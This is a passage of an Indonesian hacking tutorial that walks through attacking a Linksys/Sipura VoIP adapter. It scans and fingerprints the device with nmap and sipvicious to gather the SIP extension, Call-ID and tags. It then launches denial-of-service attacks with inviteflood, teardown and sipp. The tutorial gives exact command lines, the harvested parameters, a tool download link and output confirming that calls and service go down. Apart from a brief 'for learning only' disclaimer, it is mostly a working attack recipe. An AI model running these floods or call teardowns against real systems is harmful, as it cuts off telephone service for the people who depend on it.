+   23    Nmap scan report for 192.168.1.80
+   24    Host is up (0.0026s latency).
+   25    Not shown: 999 closed ports 
+   26    PORT   STATE SERVICE    VERSION
+   27    80/tcp open  tcpwrapped
+   28    MAC Address: 00:23:69:7C:2B:E4 (Cisco-Linksys)
+   29    Device type: VoIP adapter
+   30    Running: Sipura embedded
+   31    OS details: Sipura SPA-1001 or SPA-3000 VoIP adapter
+   32    Network Distance: 1 hop
+   33    TCP Sequence Prediction: Difficulty=262 (Good luck!)
+   34    IP ID Sequence Generation: Incremental
+   35    Read data files from: /usr/local/share/nmap
+   36    OS and Service detection performed. Please report any incorrect results
+   37    at http://nmap.org/submit/ .
+   38    Nmap done: 254 IP addresses (3 hosts up) scanned in 81.30 seconds
+   39    Raw packets sent: 4673 (203.516KB) | Rcvd: 3087 (129.594KB)
+
+   ---------------------------------------------------------------------------------
+
+   Analisa :
+
+   Wah, hasil laporan NMAP begitu panjang dan menggoda pasti disukai
+   para wanita lol, sehingga didapatkan informasi  bahwa pada IP :
+   192.168.1.80 terindikasi sebagai perangkat VoIP.
+   
+   Kok tau itu perangkat VoIP?, gini masbro perhatikan pada baris
+   29,30,31.
+
+   Baris-baris tersebut menunjukan kalau itu adalah perangkat VoIP.
+   Perhatikan juga pada baris 27 "80/tcp open  tcpwrapped" yang
+   mengindikasikan bahwa perangkat VoIP tersebut mengaktifkan metoda
+   penyetingan berbasis web base (http) yang dapat menjadi target
+   penyerangan berikutnya.
+
+   Untuk lebih detailnya maka akan dilakukan proses "fingerprint" pada
+   langkah berikutnya.
+
+
+3. FingerPrint
+   Okay...kegiatan ini hanyalah kegiatan untuk memastikan bahwa target
+   yang menjadi incaran adalah benar-benar target alias kagak salah
+   sasaran.
+
+   
+   root@bt:/pentest/voip/sipvicious# ./svmap.py 192.168.1.1-254
+
+   +-------------------------------------------------------------------------+
+   | SIP Device        | User Agent               | Fingerprint              |
+   +-------------------------------------------------------------------------+
+   | 192.168.1.80:5060 | Linksys/PAP2T-3.1.15(LS) | Linksys/PAP2T-3.1.15(LS) |
+   +-------------------------------------------------------------------------+
+
+   Analisa :
+   Uhhhuuuyyyy, ternyata benar bahwa IP 192.168.1.80 adalah perangkat
+   VoIP dengan SIP Port 5060.  Tidak hanya itu, merk dan series
+   perangkat VoIP pun bisa didapatkan yaitu : Linksys/PAP2T-3.1.15(LS).
+   Mari mang, kita lanjutkan pada proses fingerprint yang lebih bermutu
+   :
+
+
+   root@bt:/pentest/voip/sipvicious# ./svmap.py 192.168.1.80 -d
+
+
+   -----------------------------------------------------------------------------------------   
+  
+   1 ('192.168.1.80', 5060)
+   2 SIP/2.0 404 Not Found                      
+   3 To: "sipvicious"<sip:100@1.1.1.1>;tag=388074baa08bb653i
+   4 From: "sipvicious"<sip:100@1.1.1.1>;tag=63306138303135303133633401373935303131393234
+   5 Call-ID: 785522139741125439084511
+   6 CSeq: 1 OPTIONS
+   7 Via: SIP/2.0/UDP 127.0.1.1:5060;branch=z9hG4bK-3073480069
+   8 Server: Linksys/PAP2T-3.1.15(LS)  
+   9 Content-Length:0                         
+   +-------------------------------------------------------------------------+
+   10 | SIP Device        | User Agent               | Fingerprint	     |
+   11
+   +--------------------------------------------------------------------------+
+   12 | 192.168.1.80:5060 | Linksys/PAP2T-3.1.15(LS) | Linksys/PAP2T-3.1.15(LS)|  
+   +-------------------------------------------------------------------------+
+   
+  -----------------------------------------------------------------------------------------
+
+   Analisa :
+   Pusing ?, santai gan dari hasil fingerprint tersebut kita mendapatkan :
+   1. IP perangkat VoIP : 192.168.1.80, dengan SIP port 5060   
+   2. Pada baris 3, didapatkanlah VoIP number extention yaitu : 100 yang didapat
+      dari sip:100@1.1.1.1
+   3. Pada baris 3, didapatkan juga toTag number, yaitu : 388074baa08bb653i0 
+   4. Pada baris 4, didapatkan juga fromTag number, yaitu :
+      63306138303135303133633401373935303131393234  
+   5  Pada baris 5, didapatkan Call-ID, yaitu : 785522139741125439084511
+   6. Pada baris 7, didapatkan branch, yaitu : z9hG4bK-3073480069
+   7. Pada baris 8 menerangkan bahwa Server berbasis: Linksys/PAP2T-3.1.15(LS)                                                       
+
+   Sungguh mangtabs sekali informasi2 tersebut dan sangat berguna dalam
+   melakukan penyerangan VoIP.
+
+
+4. Penyerangan Mari kita lakukan penyerangan, ingat penyerangan ini
+hanya untuk pembelajaran saja, segala tindakan destruktif saya tidak
+bertanggung jawab.
+
+
+--] InviteFlood :
+
+Teknik penyerangan yang seolah2 VoIP devices diajak untuk melakukan
+komunikasi dengan banyak user.
+
+root@bt:/pentest/voip/inviteflood#
+./inviteflood <interface> <ekstensi> <IP_Domain> <IPHost_Target> <JlhPaket_Data>
+
+root@bt:/pentest/voip/inviteflood# ./inviteflood wlan0 100 192.168.1.80 192.168.1.80 10000000
+
+      +-----------------------------------------------+
+      |  inviteflood - Version 2.0                    |
+      |            June 09, 2006                      |
+      |                                               |
+      |  source IPv4 addr:port   = 192.168.1.68:9     |
+      |  dest   IPv4 addr:port   = 192.168.1.80:5060  |
+      |  targeted UA             = 100@192.168.1.80   |
+      |                                               |
+      |  Flooding destination with 10000000 packets   |
+      |  sent: 13165085                               | 
+      |  exiting...                                   |
+      +-----------------------------------------------+
+
+      Hasil selama pengiriman paket data berlangsung : 
+      * root@bt:/pentest/voip/sipp# ping 192.168.1.80
+        PING 192.168.1.80 (192.168.1.80) 56(84) bytes of data.
+        (berhenti tanpa respon apapun)
+  
+      * Port 80 HTTP pun tewas
+      * Jalur VoIP tidak bisa dihubungi
+      * VoIP Enduser mengalami terputusnya koneksi
+      * Semakin banyak jumlah paket dalam yang dikirim berarti 
+        semakin lama tewasnya VoIP devices target !!
+
+--] tearDown attacking :
+
+Penyerangan dengan melumpuhkan semua client (user) yang terkoneksi pada
+VoIP devices.
+
+O iya, pada Backtrack 5 aplikasi teardown tidak tersedia oleh karena
+itu anda harus mengambilnya a.k.a download di :
+http://www.hackingvoip.com/tools/teardown.tar.gz, jangan lupa aplikasi
+ini membutuhkan Ruby 1.8 keatas.
+
+Untuk menggunakan "tearDown" diperlukan hasil analisa dari fingerprint
+(proses 3), yaitu :
+
+1. IP perangkat VoIP : 192.168.1.80, dengan SIP port 5060   
+2. Pada baris 3, didapatkanlah VoIP number extention yaitu : 100 yang
+   didapat dari sip:100@1.1.1.1
+3. Pada baris 3, didapatkan juga toTag number, yaitu : 388074baa08bb653i0 
+4. Pada baris 4, didapatkan juga fromTag number, yaitu :
+   63306138303135303133633401373935303131393234
+5. Pada baris 5, didapatkan Call-ID, yaitu : 785522139741125439084511  
+6. Pada baris 7, didapatkan branch, yaitu : z9hG4bK-3073480069
+      
+Mari gunakan informasi tersebut sebagai parameter penyerangan dengan
+tearDown, sbb : 
+
+ root@bt:/pentest/voip/teardown#
+ ./teardown <interface> <extention> <sip_proxy> <IP_target> <callID> <fromTag> <toTag>
+
+ ./teardown wlan0 100 192.168.1.80 192.168.1.80 785522139741125439084511 63306138303135303133633401373935303131393234 388074baa08bb653i0
+
+     +-----------------------------------------------------------------------+
+     | teardown - Version 1.0                                                |
+     |            Feb. 17, 2006                                              |
+     |                                                                       |
+     | source IPv4 addr:port = 192.168.1.68                                  |
+     | dest   IPv4 addr:port = 192.168.1.80                                  |
+     | target UA             = 100@192.168.1.80                              |
+     | From Tag		    = 63306138303135303133633401373935303131393234  |
+     | To Tag		    = 388074baa08bb653i0                            |
+     | Call ID		    = 785522139741125439084511                      |
+     +-----------------------------------------------------------------------+
+
+     Hasil penyerangan : 
+     * Jalur komunikasi VoIP yang dipergunakan oleh user terputus !!
+    
+       
+--] SIP protocol attacking :
+
+Penyerangan dengan cara memberikan koneksi "total-call" user yang
+berlebihan sehingga SIP tidak lagi mampu memberikan layanan.
+
+   root@bt:/pentest/voip/sipp# ./sipp -sn uac <ip_target>
+
+   root@bt:/pentest/voip/sipp# ./sipp -sn uac 192.168.1.80
+
+   +-------------------------------------------------------------------------------+
+   | Resolving remote host '192.168.1.80'... Done.
+   |
+   +------------------------------ Scenario Screen -------- [1-9]: Change Screen --+
+   | Call-rate(length)   Port   Total-time  Total-calls  Remote-host		   |
+   | 16.0(0 ms)/1.000s   5060      58.96 s          365  192.168.1.80:5060(UDP)	   |
+   |										   |
+   | 1 new calls during 0.854 s period      0 ms scheduler resolution		   |
+   | 48 calls (limit 48)                    Peak was 48 calls, after 58 s	   |
+   | 1 Running, 238 Paused, 26 Woken up						   |
+   | 0 dead call msg (discarded)            0 out-of-call msg (discarded)	   |
+   | 3 open sockets								   |
+   |										   |
+   |                              Messages  Retrans   Timeout   Unexpected-Msg	   |
+   |    INVITE ---------->         365       436       29			   |
+   |       100 <----------         0         0         0         288		   | 
+   |       180 <----------         0         0         0         0		   |
+   |       183 <----------         0         0         0         0		   |
+   |       200 <----------  E-RTD1 0         0         0         0		   |
+   |       ACK ---------->         0         0					   |
+   |     Pause [      0ms]         0                             0		   |
+   |       BYE ---------->         0         0         0			   | 
+   |       200 <----------         0         0         0         0		   | 
+   |										   |
+   +------------------------------ Test Terminated --------------------------------+
+   
+   Hasil penyerangan :
+   * Layanan  SIP terganggu bahkan terhenti karena adanya total-call yang
+   * berlebihan
+     karena limit-calls = 48 sedangkan total-calls sudah mencapai = 365.
+   
+   * Penyerangan bisa dilipatgandakan dengan menekah tombol "+" (tanda tanda
+   * kutip)
+
+
+Akhirnya selesai sudah tulisan ini saya buat, tiada maksud untuk
+menambah kejahatan otak tapi ini adalah sejati2nya ilmu yang memang
+siapapun harus mengetahuinya, semoga saja tetap tidak memberikan kotor
+pada otak Anda semuanya.  Selamat belajar Indonesia...!!!!
+
+
+-----[ Referensi
+
+[x] http://voipsa.org
+[x] http://www.hackingvoip.com
+[x] http://www.wormulon.net
+[x] http://remote-exploit.org/codes_sipcrack.html
+[x] http://www.enderunix.org/voipong
+[x] http://www.hackingexposedvoip.com 
+
+
+-----[ Shoutz
+
+[x] Echo|Staff 
+[x] Ibunda tercinta... tanpa perjuangan bunda aku tidak akan bisa
+    seperti sekarang ini...thx bunda...;) 
+[x] MyDaughter : Faiza Debian dan Fivana Gutsy "Anakku...ini dunia 
+    ayahmu..:)"
+[x] Kang Arif s4kitj1wa, Flexus, SheraYusuf, etc
+[x] Asistenku : Rouda, Roso n Rahmad... thx for everythings.....
+[x] AllMyStudent@STMIK Bina Insani : kalian bisa menjadi apa yang 
+    kalian inginkan..belajarlah..!!!  
+[x] RNDC, MyAlmamater : FTI_Univ_Budi_Luhur, IndonesianLockPicking.
